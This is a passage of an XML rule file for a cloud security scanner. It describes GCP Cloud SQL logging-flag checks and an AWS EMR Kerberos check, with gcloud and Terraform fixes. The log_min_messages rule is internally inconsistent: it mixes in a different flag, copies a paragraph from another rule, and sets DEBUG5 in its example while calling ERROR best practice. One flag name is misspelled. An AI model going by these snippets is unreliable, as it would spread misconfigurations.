<li><strong>Resource</strong>: google_sql_database_instance</li>
<li><strong>Arguments</strong>:<br/>
database<em>version = "MYSQL</em>* "<br/>
settings::database_flags: key:"local_infile", value:  by default set to "on"</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "google_sql_database_instance" "default" {
  name             = "master-instance"
  database_version = "MYSQL_8_0"
  region           = "us-central1"

  settings {
+         database_flags {
+            name  = "local_infile"
+            value = "off"
          }
  }
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/bc_gcp_sql_1' target='_blank'> https://docs.bridgecrew.io/docs/bc_gcp_sql_1</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/bc_gcp_sql_1' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_GCP_54</key>
    <name>Ensure GCP PostgreSQL instance database flag log_lock_waits is enabled</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="gcp-postgresql-instance-database-flag-log_lock_waits-is-disabled"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-gcp-postgre-sql-instance-database-flag-log-lock-waits-is-disabled"></div>GCP PostgreSQL instance database flag log_lock_waits is disabled</div><a aria-label="Skip link to GCP PostgreSQL instance database flag log_lock_waits is disabled" class="heading-anchor-icon fa fa-anchor" href="#gcp-postgresql-instance-database-flag-log_lock_waits-is-disabled"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Deadlock timeout defines the time to wait on a lock before checking for any conditions. Frequent runovers on deadlock timeout can be an indication of an underlying issue. Log these waits on locks using the <strong>log_lock_waits</strong> database flag and use the information to identify poor performance due to locking delays, or if a specially-crafted SQL is attempting to starve resources through holding locks for excessive amounts of time. </p>
<p>We recommended you set the <strong>log_lock_waits</strong> flag for a PostgreSQL instance to <strong>On</strong>.  This will create a log for any session and allow you to identify waits that take longer than the allotted <strong>deadlock_timeout</strong> time to acquire a lock.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime-remediation"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime-remediation"></div>Fix - Runtime Remediation</div><a aria-label="Skip link to Fix - Runtime Remediation" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime-remediation"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="gcp-console"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-gcp-console"></div>GCP Console</div><a aria-label="Skip link to GCP Console" class="heading-anchor-icon fa fa-anchor" href="#gcp-console"></a></h2>
<p>To change the policy using the GCP Console, follow these steps:</p>
<ol>
<li>Log in to the GCP Console at <a href="https://console.cloud.google.com" target="_self">https://console.cloud.google.com</a>.</li>
<li>Navigate to <a href="https://console.cloud.google.com/sql/instances" target="_self">Cloud SQL Instances</a>.</li>
<li>Select the <strong>PostgreSQL instance</strong> where the database flag needs to be enabled.</li>
<li>Click <strong>Edit</strong>.</li>
<li>Scroll down to the <strong>Flags</strong> section.</li>
<li>To set a flag that has not been set on the instance before, click <strong>Add item</strong>.</li>
<li>Select the flag <strong>log_lock_waits</strong> from the drop-down menu, and set its value to <strong>On</strong>.</li>
<li>Click <strong>Save</strong>.</li>
<li>Confirm the changes in the <strong>Flags</strong> section on the <strong>Overview</strong> page.</li>
</ol>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cli-command"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cli-command"></div>CLI Command</div><a aria-label="Skip link to CLI Command" class="heading-anchor-icon fa fa-anchor" href="#cli-command"></a></h2>
<ol>
<li>List all Cloud SQL database instances using the following command:<br/>
<button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">gcloud sql instances list</code></li>
<li>Configure the log_lock_waits database flag for every Cloud SQL PosgreSQL database instance using the below command:<br/>
<button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">gcloud sql instances patch INSTANCE_NAME --database-flags log_lock_waits=on</code></li>
</ol>
<blockquote class="callout callout_info" theme="&#128216;"><h3 class="callout-heading"><span class="callout-icon">&#128216;</span><p>Note</p></h3><p>This command will overwrite all database flags previously set. To keep these flags, and add new ones, include the values for all flags to be set on the instance. Any flag not specifically included is set to its default value. For flags that do not take a value, specify the flag name followed by an equals sign (<strong>=</strong>).</p></blockquote>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource</strong>: google_sql_database_instance</li>
<li><strong>Arguments</strong>:<br/>
database<em>version = "POSTGRES</em>* "<br/>
settings::database_flags: key:"log_lock_waits", value:  by default set to "off"</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "google_sql_database_instance" "default" {
  name             = "master-instance"
  database_version = "POSTGRES_11"
  region           = "us-central1"

  settings {
+         database_flags {
+            name  = "log_lock_waits"
+            value = "on"
          }
  }
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/bc_gcp_sql_5' target='_blank'> https://docs.bridgecrew.io/docs/bc_gcp_sql_5</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/bc_gcp_sql_5' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_GCP_55</key>
    <name>Ensure GCP PostgreSQL instance database flag log_min_messages is set</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="gcp-postgresql-instance-database-flag-log_min_messages-is-not-set"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-gcp-postgre-sql-instance-database-flag-log-min-messages-is-not-set"></div>GCP PostgreSQL instance database flag log_min_messages is not set</div><a aria-label="Skip link to GCP PostgreSQL instance database flag log_min_messages is not set" class="heading-anchor-icon fa fa-anchor" href="#gcp-postgresql-instance-database-flag-log_min_messages-is-not-set"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>The <strong>log_min_error_statement</strong> database flag defines the minimum message severity level that is considered to be an error statement. Messages for error statements are logged with the SQL statement. Valid values include: DEBUG5, DEBUG4, DEBUG3, DEBUG2, DEBUG1, INFO, NOTICE, WARNING, ERROR, LOG, FATAL, and PANIC. Each severity level includes subsequent levels.</p>
<p>Deadlock timeout defines the time to wait on a lock before checking for any conditions. Frequent runovers on deadlock timeout can be an indication of an underlying issue. Log these waits on locks using the <strong>log_lock_waits</strong> database flag and use the information to identify poor performance due to locking delays, or if a specially-crafted SQL is attempting to starve resources through holding locks for excessive amounts of time. </p>
<p>We recommend you set the <strong>log_min_error_statement</strong> flag for PostgreSQL database instances in accordance with your organization's logging policy for auditing purposes. Auditing helps you troubleshoot operational problems, and also permits forensic analysis. If <strong>log_min_error_statement</strong> is not set to the correct value, messages may not be classified as error messages appropriately. Considering general log messages as error messages would make it difficult to find actual errors, while considering only stricter severity levels as error messages may skip actual errors to log their SQL statements. </p>
<blockquote class="callout callout_info" theme="&#128216;"><h3 class="callout-heading"><span class="callout-icon">&#128216;</span><p>Note</p></h3><p>To effectively turn off logging failing statements, set this parameter to PANIC.<br/>
ERROR is considered the best practice setting.<br/>
Changes should only be made in accordance with the organization's logging policy.</p></blockquote>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime </div><a aria-label="Skip link to Fix - Runtime " class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="gcp-console"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-gcp-console"></div>GCP Console</div><a aria-label="Skip link to GCP Console" class="heading-anchor-icon fa fa-anchor" href="#gcp-console"></a></h2>
<p>To change the policy using the GCP Console, follow these steps:</p>
<ol>
<li>Log in to the GCP Console at <a href="https://console.cloud.google.com" target="_self">https://console.cloud.google.com</a>.</li>
<li>Navigate to <a href="https://console.cloud.google.com/sql/instances" target="_self">Cloud SQL Instances</a>.</li>
<li>Select the <strong>PostgreSQL instance</strong> where the database flag needs to be enabled.</li>
<li>Click <strong>Edit</strong>.</li>
<li>Scroll down to the <strong>Flags</strong> section.</li>
<li>To set a flag that has not been set on the instance before, click <strong>Add item</strong>.</li>
<li>Select the flag <strong>log_min_error_statement</strong> from the drop-down menu, and set an appropriate value.</li>
<li>Click <strong>Save</strong>.</li>
<li>Confirm the changes in the <strong>Flags</strong> section on the <strong>Overview</strong> page.</li>
</ol>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cli-command"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cli-command"></div>CLI Command</div><a aria-label="Skip link to CLI Command" class="heading-anchor-icon fa fa-anchor" href="#cli-command"></a></h2>
<ol>
<li>List all Cloud SQL database Instances using the following command:<br/>
<button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">gcloud sql instances list</code></li>
<li>Configure the log_min_error_statement database flag for every Cloud SQL PosgreSQL database instance using the below command.<br/>
<button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">gcloud sql instances patch INSTANCE_NAME --database-flags log_min_error_statement=&lt;DEBUG5|DEBUG4|DEBUG3|DEBUG2|DEBUG1|INFO|NOTICE|WARNI NG|ERROR|LOG|FATAL|PANIC&gt;</code></li>
</ol>
<blockquote class="callout callout_info" theme="&#128216;"><h3 class="callout-heading"><span class="callout-icon">&#128216;</span><p>Note</p></h3><p>This command will overwrite all database flags previously set. To keep those and add new ones, include the values for all flags to be set on the instance; any flag not specifically included is set to its default value. For flags that do not take a value, specify the flag name followed by an equals sign (<strong>=</strong>).</p></blockquote>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource</strong>: google_sql_database_instance</li>
<li><strong>Arguments</strong>:<br/>
database<em>version = "POSTGRES</em>* "<br/>
settings::database_flags: key:"log_min_messages", value:  by default set to "ERROR"<br/>
Argument value can be one of the following: <button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">DEBUG5</code>, <button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">DEBUG4</code>, <button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">DEBUG3</code>, <button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">DEBUG2</code>, <button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">DEBUG1</code>, <button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">INFO</code>, <button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">NOTICE</code>, <button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">WARNING</code>, <button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">ERROR</code>, <button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">LOG</code>, <button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">FATAL</code>, and <button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">PANIC</code></li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "google_sql_database_instance" "default" {
  name             = "master-instance"
  database_version = "POSTGRES_11"
  region           = "us-central1"

  settings {
+         database_flags {
+            name  = "log_min_messages"
+            value = "DEBUG5"
          }
  }
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/bc_gcp_sql_6' target='_blank'> https://docs.bridgecrew.io/docs/bc_gcp_sql_6</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/bc_gcp_sql_6' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_GCP_56</key>
    <name>Ensure GCP PostgreSQL instance database flag log_temp_files is set to 0</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="gcp-postgresql-instance-database-flag-log_temp_files-is-not-set-to-0"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-gcp-postgre-sql-instance-database-flag-log-temp-files-is-not-set-to-0"></div>GCP PostgreSQL instance database flag log_temp_files is not set to 0</div><a aria-label="Skip link to GCP PostgreSQL instance database flag log_temp_files is not set to 0" class="heading-anchor-icon fa fa-anchor" href="#gcp-postgresql-instance-database-flag-log_temp_files-is-not-set-to-0"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>PostgreSQL can create a temporary file for actions such as sorting, hashing and temporary query results when these operations exceed <strong>work_mem</strong>. The <strong>log_temp_files</strong> flag controls logging names and the file size when it is deleted. Configuring <strong>log_temp_files</strong> to zero (<strong>0</strong>) causes all temporary file information to be logged, while positive values log only files whose size are greater than or equal to the specified number of kilobytes. A value of <strong>-1</strong> disables temporary file information logging.</p>
<p>We recommend you set the <strong>log_temp_files</strong> database flag for Cloud SQL PostgreSQL instances is set to zero (<strong>0</strong>). If temporary files are not logged, it may be difficult to identify potential performance issues caused by either poor application coding, or deliberate resource starvation attempts.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime </div><a aria-label="Skip link to Fix - Runtime " class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="gcp-console"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-gcp-console"></div>GCP Console</div><a aria-label="Skip link to GCP Console" class="heading-anchor-icon fa fa-anchor" href="#gcp-console"></a></h2>
<p>To change the policy using the GCP Console, follow these steps:</p>
<ol>
<li>Log in to the GCP Console at <a href="https://console.cloud.google.com" target="_self">https://console.cloud.google.com</a>.</li>
<li>Navigate to <a href="https://console.cloud.google.com/sql/instances" target="_self">Cloud SQL Instances</a>.</li>
<li>Select the <strong>PostgreSQL instance</strong> where the database flag needs to be enabled.</li>
<li>Click <strong>Edit</strong>.</li>
<li>Scroll down to the <strong>Flags</strong> section.</li>
<li>To set a flag that has not been set on the instance before, click <strong>Add item</strong>.</li>
<li>Select the flag <strong>log_temp_files</strong> from the drop-down menu, and set its value to <strong>0</strong>.</li>
<li>Click <strong>Save</strong>.</li>
<li>Confirm the changes in the <strong>Flags</strong> section on the <strong>Overview</strong> page.</li>
</ol>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cli-command"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cli-command"></div>CLI Command</div><a aria-label="Skip link to CLI Command" class="heading-anchor-icon fa fa-anchor" href="#cli-command"></a></h2>
<ol>
<li>List all Cloud SQL database instances using the following command:<br/>
<button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">gcloud sql instances list</code></li>
<li>Configure the log_temp_files database flag for every Cloud SQL PosgreSQL database instance using the below command.<br/>
<button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">gcloud sql instances patch INSTANCE_NAME --database-flags log_temp_files=</code>0``<br/>
Note: This command will overwrite all database flags previously set. To keep those and add new ones, include the values for all flags to be set on the instance; any flag not specifically included is set to its default value. For flags that do not take a value, specify the flag name followed by an equals sign ("=").</li>
</ol>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource</strong>: google_sql_database_instance</li>
<li><strong>Arguments</strong>:<br/>
database<em>version = "POSTGRES</em>* "<br/>
settings::database_flags: key:"log_temp_files", value:  by default set to "-1"</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "google_sql_database_instance" "default" {
  name             = "master-instance"
  database_version = "POSTGRES_11"
  region           = "us-central1"

  settings {
+         database_flags {
+            name  = "log_temp_files"
+            value = "0"
          }
  }
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/bc_gcp_sql_7' target='_blank'> https://docs.bridgecrew.io/docs/bc_gcp_sql_7</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/bc_gcp_sql_7' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_GCP_57</key>
    <name>Ensure GCP PostgreSQL instance database flag log_min_duration_statement is set to -1</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="gcp-postgresql-instance-database-flag-log_min_duration_statement-is-not-set-to--1"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-gcp-postgre-sql-instance-database-flag-log-min-duration-statement-is-not-set-to-1"></div>GCP PostgreSQL instance database flag log_min_duration_statement is not set to -1</div><a aria-label="Skip link to GCP PostgreSQL instance database flag log_min_duration_statement is not set to -1" class="heading-anchor-icon fa fa-anchor" href="#gcp-postgresql-instance-database-flag-log_min_duration_statement-is-not-set-to--1"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Logging SQL statements may include sensitive information that should not be recorded in logs. This recommendation is applicable to PostgreSQL database instances. The <strong>log_min_duration_statement</strong> database flag defines the minimum amount of execution time in milliseconds of a statement where the total duration of the statement is logged. </p>
<p>We recommend you ensure the <strong>log_min_duration_statement</strong> database flag for Cloud SQL PostgreSQL instances is disabled. To achieve this, set the value to <strong>-1</strong>.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime </div><a aria-label="Skip link to Fix - Runtime " class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="gcp-console"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-gcp-console"></div>GCP Console</div><a aria-label="Skip link to GCP Console" class="heading-anchor-icon fa fa-anchor" href="#gcp-console"></a></h2>
<p>To change the policy using the GCP Console, follow these steps:</p>
<ol>
<li>Log in to the GCP Console at <a href="https://console.cloud.google.com" target="_self">https://console.cloud.google.com</a>.</li>
<li>Navigate to <a href="https://console.cloud.google.com/sql/instances" target="_self">Cloud SQL Instances</a>.</li>
<li>Select the <strong>PostgreSQL instance</strong> where the database flag needs to be enabled.</li>
<li>Click <strong>Edit</strong>.</li>
<li>Scroll down to the <strong>Flags</strong> section.</li>
<li>To set a flag that has not been set on the instance before, click <strong>Add item</strong>.</li>
<li>Select the flag <strong>og_min_duration_statement</strong> from the drop-down menu, and set its value to <strong>-1</strong>.</li>
<li>Click <strong>Save</strong>.</li>
<li>Confirm the changes in the <strong>Flags</strong> section on the <strong>Overview</strong> page.</li>
</ol>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cli-command"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cli-command"></div>CLI Command</div><a aria-label="Skip link to CLI Command" class="heading-anchor-icon fa fa-anchor" href="#cli-command"></a></h2>
<ol>
<li>List all Cloud SQL database instances using the following command:<br/>
<button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">gcloud sql instances list</code></li>
<li>Configure the <button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">log_min_duration_statement</code> flag for every Cloud SQL PosgreSQL database instance using the below command:<br/>
<button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">gcloud sql instances patch INSTANCE_NAME --database-flags log_min_duration_statement=-1</code></li>
</ol>
<blockquote class="callout callout_info" theme="&#128216;"><h3 class="callout-heading"><span class="callout-icon">&#128216;</span><p>Note</p></h3><p>This command will overwrite all database flags previously set. To keep those and add new ones, include the values for all flags to be set on the instance; any flag not specifically included is set to its default value. For flags that do not take a value, specify the flag name followed by an equals sign (<strong>=</strong>).</p></blockquote>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource</strong>: google_sql_database_instance</li>
<li><strong>Arguments</strong>:<br/>
database<em>version = "POSTGRES</em>* "<br/>
settings::database_flags: key:"log_min_duration_statement", value:  by default set to -1</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "google_sql_database_instance" "default" {
  name             = "master-instance"
  database_version = "POSTGRES_11"
  region           = "us-central1"

  settings {
+         database_flags {
+            name  = "log_min_duration_statement"
+            value = "-1"
          }
  }
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/bc_gcp_sql_8' target='_blank'> https://docs.bridgecrew.io/docs/bc_gcp_sql_8</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/bc_gcp_sql_8' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_114</key>
    <name>Ensure that AWS EMR clusters have Kerberos enabled</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-emr-cluster-is-not-configured-with-kerberos-authentication"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-emr-cluster-is-not-configured-with-kerberos-authentication"></div>AWS EMR cluster is not configured with Kerberos authentication</div><a aria-label="Skip link to AWS EMR cluster is not configured with Kerberos authentication" class="heading-anchor-icon fa fa-anchor" href="#aws-emr-cluster-is-not-configured-with-kerberos-authentication"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>This checks ensure that for EMR cluster using Kerberos, that the kerberos attributes are used and that the realm is set. </p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> aws_emr_cluster</li>
<li><strong>Argument:</strong> kerberos_attributes.realm </li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "aws_emr_cluster" "test" {
...
  kerberos_attributes {
    kdc_admin_password                = "somePassword"
+   realm                             = "EC2.INTERNAL"
    }
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-that-emr-clusters-have-kerberos-enabled' target='_blank'> https://docs.bridgecrew.io/docs/ensure-that-emr-clusters-have-kerberos-enabled</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-that-emr-clusters-have-kerberos-enabled' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_124</key>
    <name>Ensure AWS CloudFormation stacks are sending event notifications to an SNS topic</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-cloudformation-stack-configured-without-sns-topic"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-cloud-formation-stack-configured-without-sns-topic"></div>AWS CloudFormation stack configured without SNS topic</div><a aria-label="Skip link to AWS CloudFormation stack configured without SNS topic" class="heading-anchor-icon fa fa-anchor" href="#aws-cloudformation-stack-configured-without-sns-topic"></a></h1>
